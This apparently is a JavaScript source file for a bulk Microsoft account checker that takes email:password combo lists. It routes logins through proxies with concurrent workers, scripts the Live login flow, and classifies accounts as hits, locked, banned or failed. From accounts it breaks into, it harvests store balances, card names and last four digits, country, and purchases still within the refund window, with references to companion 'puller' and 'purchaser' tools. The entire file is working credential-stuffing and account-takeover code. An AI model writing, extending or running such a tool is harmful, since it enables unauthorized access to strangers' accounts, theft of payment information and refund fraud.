// ============================================================
//  Microsoft Refund Eligibility Checker
//  Uses the SAME proven auth flow as the puller/checker tools.
//  Logs into Microsoft accounts, fetches order/purchase history,
//  and checks if any digital items are within the 14-day refund window.
// ============================================================

const { proxiedFetch } = require("./proxy-manager");

const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
const REFUND_WINDOW_DAYS = 14;
const MAX_RETRIES = 3;
const RETRY_DELAY = 2000;

// Use the SAME OAuth client that the puller's store login uses — we already
// know it works end-to-end. After login we don't need a special PIFD scope:
// we go through `acquire-onbehalf-of-token` like the purchaser does and call
// the order APIs with `MSAuth1.0 t=...` which is the modern flow Microsoft
// accepts (the legacy MSADELEGATE1.0/PIFD flow has been deprecated).
const AUTHORIZE_URL =
  "https://login.live.com/oauth20_authorize.srf" +
  "?client_id=0000000048170EF2" +
  "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf" +
  "&response_type=token" +
  "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL" +
  "&display=touch";

const COMMON_HEADERS = {
  "User-Agent": USER_AGENT,
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "Accept-Language": "en-US,en;q=0.9",
  "Accept-Encoding": "gzip, deflate",
};

// ── Cookie Jar ──────────────────────────────────────────────

class CookieJar {
  constructor() { this.cookies = {}; }
  extract(res) {
    const sc = res.headers.getSetCookie?.() || [];
    for (const c of sc) {
      const parts = c.split(";")[0].trim();
      const eq = parts.indexOf("=");
      if (eq > 0) this.cookies[parts.substring(0, eq)] = parts.substring(eq + 1);
    }
  }
  toString() {
    return Object.entries(this.cookies).map(([k, v]) => `${k}=${v}`).join("; ");
  }
  dictString() {
    return JSON.stringify(this.cookies);
  }
}

// ── Session helpers (manual redirect to preserve cookies) ───

async function sessionGet(url, jar, extraHeaders = {}) {
  let currentUrl = url;
  let maxRedirects = 10;
  while (maxRedirects-- > 0) {
    const res = await proxiedFetch(currentUrl, {
      headers: { ...COMMON_HEADERS, ...extraHeaders, Cookie: jar.toString() },
      redirect: "manual",
    });
    jar.extract(res);
    if (res.status >= 300 && res.status < 400) {
      const loc = res.headers.get("location");
      if (!loc) break;
      currentUrl = new URL(loc, currentUrl).href;
      try { await res.text(); } catch {}
      continue;
    }
    const text = await res.text();
    return { text, url: currentUrl, res };
  }
  throw new Error("Too many redirects");
}

async function sessionPost(url, body, jar, extraHeaders = {}) {
  let currentUrl = url;
  let method = "POST";
  let currentBody = body;
  let maxRedirects = 10;
  while (maxRedirects-- > 0) {
    const res = await proxiedFetch(currentUrl, {
      method,
      headers: { ...COMMON_HEADERS, ...extraHeaders, Cookie: jar.toString() },
      body: currentBody,
      redirect: "manual",
    });
    jar.extract(res);
    if (res.status >= 300 && res.status < 400) {
      const loc = res.headers.get("location");
      if (!loc) break;
      currentUrl = new URL(loc, currentUrl).href;
      if (res.status !== 307 && res.status !== 308) { method = "GET"; currentBody = undefined; }
      try { await res.text(); } catch {}
      continue;
    }
    const text = await res.text();
    return { text, url: currentUrl, res };
  }
  throw new Error("Too many redirects");
}

// ── Dynamic PPFT + urlPost extraction (same as puller) ──────

function parseLR(text, left, right) {
  try {
    const start = text.indexOf(left);
    if (start === -1) return "";
    const s = start + left.length;
    const end = text.indexOf(right, s);
    if (end === -1) return "";
    return text.substring(s, end);
  } catch { return ""; }
}

function parseLRRe(text, left, right) {
  const escaped = left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const escapedR = right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const m = text.match(new RegExp(`${escaped}(.*?)${escapedR}`, "s"));
  return m ? m[1] : "";
}

function checkStatus(text, url, cookiesStr) {
  if (
    text.includes("Your account or password is incorrect") ||
    text.includes("That Microsoft account doesn\\'t exist") ||
    text.includes("That Microsoft account doesn't exist") ||
    text.includes("Sign in to your Microsoft account") ||
    text.includes("timed out")
  ) return "FAILURE";
  if (text.includes(",AC:null,urlFedConvertRename")) return "BAN";
  if (
    text.includes("account.live.com/recover?mkt") || text.includes("recover?mkt") ||
    text.includes("account.live.com/identity/confirm?mkt") || text.includes("Email/Confirm?mkt")
  ) return "2FACTOR";
  if (text.includes("/cancel?mkt=") || text.includes("/Abuse?mkt=")) return "CUSTOM_LOCK";
  if ((cookiesStr.includes("ANON") || cookiesStr.includes("WLSSC")) &&
      url.includes("https://login.live.com/oauth20_desktop.srf?")) return "SUCCESS";
  return "UNKNOWN_FAILURE";
}

function isWithinRefundWindow(dateStr) {
  const cleaned = dateStr.split("+")[0].split("Z")[0].substring(0, 26);
  const dt = new Date(cleaned);
  if (isNaN(dt.getTime())) return { eligible: false, dt: null };
  const diffMs = Date.now() - dt.getTime();
  const diffDays = diffMs / (1000 * 60 * 60 * 24);
  return { eligible: diffDays <= REFUND_WINDOW_DAYS, dt };
}

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

// ── Main check logic ────────────────────────────────────────

async function attemptCheck(email, password) {
  const result = {
    user: email, password,
    status: "fail", captures: {}, detail: "",
    refundable: [],
  };

  const jar = new CookieJar();

  try {
    // Step 1: Get login page with DYNAMIC PPFT extraction
    const r0 = await sessionGet(AUTHORIZE_URL, jar);

    // Dynamic PPFT extraction — same patterns as puller
    let ppft = parseLR(r0.text, 'name="PPFT" id="i0327" value="', '"');
    if (!ppft) ppft = parseLRRe(r0.text, "sFT:'", "'");
    if (!ppft) ppft = parseLRRe(r0.text, 'sFTTag:\'', "'");
    if (!ppft) {
      // Fallback: any PPFT value tag
      const ppftMatch = r0.text.match(/name="PPFT"[^>]*value="([^"]+)"/);
      if (ppftMatch) ppft = ppftMatch[1];
    }
    if (!ppft) {
      const ppftMatch2 = r0.text.match(/value=\\"(.+?)\\"/s) || r0.text.match(/value="(.+?)"/s);
      if (ppftMatch2) ppft = ppftMatch2[1];
    }
    if (!ppft) { result.detail = "PPFT not found"; return result; }

    // Dynamic urlPost extraction — same patterns as puller
    let urlPost = parseLRRe(r0.text, "urlPost:'", "'");
    if (!urlPost) urlPost = parseLRRe(r0.text, 'urlPost:"', '"');
    if (!urlPost) {
      const upMatch = r0.text.match(/"urlPost":"(.+?)"/s) || r0.text.match(/urlPost:'(.+?)'/s);
      if (upMatch) urlPost = upMatch[1];
    }
    if (!urlPost) { result.detail = "urlPost not found"; return result; }

    // Step 2: POST credentials
    const postData = new URLSearchParams({
      ps: "2", PPFT: ppft, PPSX: "PassportRN", NewUser: "1",
      login: email, loginfmt: email, passwd: password,
      type: "11", LoginOptions: "1", i13: "1",
      IsFidoSupported: "1", isSignupPost: "0",
    }).toString();

    const r1 = await sessionPost(urlPost, postData, jar, {
      Host: "login.live.com", "Content-Type": "application/x-www-form-urlencoded",
      Origin: "https://login.live.com", Referer: r0.url,
      "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
    });

    const cookiesStr = jar.dictString();
    const status = checkStatus(r1.text, r1.url, cookiesStr);

    if (status !== "SUCCESS") {
      const labels = {
        FAILURE: ["fail", "Invalid Credentials"],
        UNKNOWN_FAILURE: ["fail", "Unknown Failure"],
        BAN: ["retry", "Rate limited"],
        "2FACTOR": ["locked", "2FA/Verify"],
        CUSTOM_LOCK: ["locked", "Custom Lock"],
      };
      const [s, d] = labels[status] || ["fail", status];
      result.status = s;
      result.detail = d;
      return result;
    }

    // Step 3: Get MSAuth1.0 token via account.microsoft.com — same flow the
    // purchaser uses successfully. This replaced the deprecated PIFD delegate flow.
    let msToken = "";
    try {
      // Touch buynow first like the puller does — primes the cookies
      await proxiedFetch("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", {
        headers: { "User-Agent": USER_AGENT, Cookie: jar.toString() },
      }).catch(() => {});

      const tokRes = await proxiedFetch(
        "https://account.microsoft.com/auth/acquire-onbehalf-of-token?scopes=MSComServiceMBISSL",
        {
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
            "Cache-Control": "no-cache",
            Pragma: "no-cache",
            Referer: "https://account.microsoft.com/billing/orders",
            "User-Agent": USER_AGENT,
            Cookie: jar.toString(),
          },
        }
      );
      if (tokRes.status === 200) {
        try {
          const tokData = await tokRes.json();
          if (Array.isArray(tokData) && tokData[0]?.token) msToken = tokData[0].token;
        } catch {}
      }
    } catch {}

    if (!msToken) { result.status = "fail"; result.detail = "Token failed"; return result; }

    const payHeaders = {
      "User-Agent": USER_AGENT, Pragma: "no-cache",
      Accept: "application/json", "Accept-Language": "en-US,en;q=0.9",
      Authorization: `MSAuth1.0 t=${msToken}, p=MSAComm`,
      "Content-Type": "application/json",
      Origin: "https://account.microsoft.com",
      Referer: "https://account.microsoft.com/billing/orders",
    };

    const refundableItems = [];

    // Method 1: Payment transactions
    try {
      const txRes = await proxiedFetch(
        "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
        { headers: { ...payHeaders, Cookie: jar.toString() } }
      );
      const txBody = await txRes.text();
      let txJson = {};
      try { txJson = JSON.parse(txBody); } catch {}

      if (typeof txJson === "object" && txJson !== null) {
        const subs = txJson.subscriptions || txJson.items || [];
        if (Array.isArray(subs)) {
          for (const sub of subs) {
            const start = sub.startDate || sub.purchaseDate || "";
            const title = sub.title || sub.description || "Subscription";
            const amount = sub.totalAmount || sub.amount || "";
            const currency = sub.currency || "";
            if (start) {
              const { eligible, dt } = isWithinRefundWindow(start);
              if (eligible && dt) {
                refundableItems.push({
                  title, date: dt.toISOString().split("T")[0],
                  type: "Subscription",
                  amount: `${amount} ${currency}`.trim(),
                  auto_renew: sub.autoRenew ?? null,
                  days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
                });
              }
            }
          }
        }
      }

      if (refundableItems.length === 0) {
        const datesFound = [...txBody.matchAll(/"(?:startDate|purchaseDate|orderDate|transactionDate)"\s*:\s*"([^"]+)"/g)].map(m => m[1]);
        const titlesFound = [...txBody.matchAll(/"title"\s*:\s*"([^"]+)"/g)].map(m => m[1]);
        const amountsFound = [...txBody.matchAll(/"totalAmount"\s*:\s*([0-9.]+)/g)].map(m => m[1]);
        for (let i = 0; i < datesFound.length; i++) {
          const { eligible, dt } = isWithinRefundWindow(datesFound[i]);
          if (eligible && dt) {
            refundableItems.push({
              title: titlesFound[i] || "Unknown", date: dt.toISOString().split("T")[0],
              type: "Purchase", amount: amountsFound[i] || "N/A",
              days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
            });
          }
        }
      }
    } catch {}

    // Method 2: Order history
    try {
      const ordersRes = await proxiedFetch(
        "https://purchase.mp.microsoft.com/v7.0/users/me/orders?market=US&language=en-US&lineItemStates=All&count=50&orderBy=Date",
        { headers: { ...payHeaders, Cookie: jar.toString() } }
      );
      let ordersJson = {};
      try { ordersJson = await ordersRes.json(); } catch {}

      const ordersList = ordersJson.items || ordersJson.orders || [];
      if (Array.isArray(ordersList)) {
        for (const order of ordersList) {
          const orderDate = order.orderDate || order.creationDate || order.purchaseDate || "";
          if (!orderDate) continue;
          const { eligible, dt } = isWithinRefundWindow(orderDate);
          if (!eligible || !dt) continue;
          const lineItems = order.lineItems || order.items || [order];
          for (const item of (Array.isArray(lineItems) ? lineItems : [lineItems])) {
            const title = item.productTitle || item.title || item.name || item.description || "Unknown Item";
            const amount = item.amount || item.totalPrice || item.listPrice || "";
            const currency = item.currencyCode || item.currency || "";
            const refundState = item.refundState || item.refundEligibility || "";
            if (typeof refundState === "string" && refundState.toLowerCase().includes("refunded")) continue;
            if (refundableItems.some(r => r.title === title && r.date === dt.toISOString().split("T")[0])) continue;
            refundableItems.push({
              title, date: dt.toISOString().split("T")[0],
              type: item.productType || item.type || "Digital",
              amount: amount ? `${amount} ${currency}`.trim() : "N/A",
              days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
            });
          }
        }
      }
    } catch {}

    // Method 3: Commerce purchase history
    try {
      const purchaseRes = await proxiedFetch(
        "https://purchase.mp.microsoft.com/v8.0/b2b/orders/search?beneficiary=me&market=US&ordersState=All&pgSize=25",
        { headers: { ...payHeaders, Cookie: jar.toString() } }
      );
      let purchaseJson = {};
      try { purchaseJson = await purchaseRes.json(); } catch {}
      const itemsList = purchaseJson.items || purchaseJson.orders || [];
      if (Array.isArray(itemsList)) {
        for (const item of itemsList) {
          const pdate = item.orderDate || item.creationDate || item.purchaseDate || "";
          if (!pdate) continue;
          const { eligible, dt } = isWithinRefundWindow(pdate);
          if (!eligible || !dt) continue;
          const title = item.productTitle || item.title || item.productName || "Unknown";
          const amount = item.totalPrice || item.amount || "";
          const currency = item.currencyCode || "";
          if (refundableItems.some(r => r.title === title && r.date === dt.toISOString().split("T")[0])) continue;
          refundableItems.push({
            title, date: dt.toISOString().split("T")[0],
            type: item.productType || "Digital",
            amount: amount ? `${amount} ${currency}`.trim() : "N/A",
            days_ago: Math.floor((Date.now() - dt.getTime()) / 86400000),
          });
        }
      }
    } catch {}

    // Payment info capture
    try {
      const payRes = await proxiedFetch(
        "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
        { headers: { ...payHeaders, Cookie: jar.toString() } }
      );
      const payBody = await payRes.text();
      const balance = parseLR(payBody, 'balance":', ',"') || "N/A";
      const ccName = parseLR(payBody, 'paymentMethodFamily":"credit_card","display":{"name":"', '"');
      const last4 = parseLR(payBody, 'lastFourDigits":"', '",');
      const countryCode = parseLR(payBody, '"country":"', '"');
      if (balance && balance !== "N/A") result.captures["Balance"] = `$${balance}`;
      if (ccName || last4) result.captures["Payment"] = `${ccName} ****${last4}`.trim();
      if (countryCode) result.captures["Country"] = countryCode;
    } catch {}

    result.refundable = refundableItems;
    if (refundableItems.length > 0) {
      result.status = "hit";
      const itemsSummary = refundableItems.slice(0, 5).map(item => {
        return `${item.title} (${item.days_ago}d ago, ${item.amount})`;
      });
      result.captures["Refundable"] = itemsSummary.join(" | ");
      result.captures["Total Refundable"] = String(refundableItems.length);
    } else {
      result.status = "free";
      result.captures["Refundable"] = "None found";
    }
    return result;

  } catch (err) {
    if (err.message && err.message.includes("timed out")) {
      result.status = "retry"; result.detail = "timed out";
    } else {
      result.status = "fail"; result.detail = String(err.message || err).substring(0, 100);
    }
    return result;
  }
}

async function checkSingle(email, password) {
  for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
    const result = await attemptCheck(email, password);
    if (result.status === "retry") {
      if (attempt < MAX_RETRIES - 1) {
        await sleep(RETRY_DELAY * (attempt + 1));
        continue;
      }
      result.status = "fail";
      result.detail = `retry exhausted (${result.detail})`;
    }
    return result;
  }
}

const { runPool } = require("./worker-pool");

async function checkRefundAccounts(accounts, threads = 10, onProgress, signal) {
  const parsed = accounts.map(a => {
    const i = a.indexOf(":");
    return i === -1 ? { email: a, password: "" } : { email: a.substring(0, i), password: a.substring(i + 1) };
  });

  const results = await runPool({
    items: parsed,
    concurrency: threads,
    signal,
    scope: "refund",
    runner: async ({ email, password }) => {
      if (!email || !password) {
        return { result: { user: email, password, status: "fail", captures: {}, detail: "invalid format", refundable: [] } };
      }
      try {
        return { result: await checkSingle(email, password) };
      } catch (err) {
        return { result: { user: email, password, status: "fail", captures: {}, detail: (err?.message || String(err)).slice(0, 100), refundable: [] } };
      }
    },
    onResult: (r, done, total) => {
      if (onProgress) onProgress(done, total, r?.status);
    },
  });
  return results.filter(Boolean);
}

module.exports = { checkRefundAccounts };
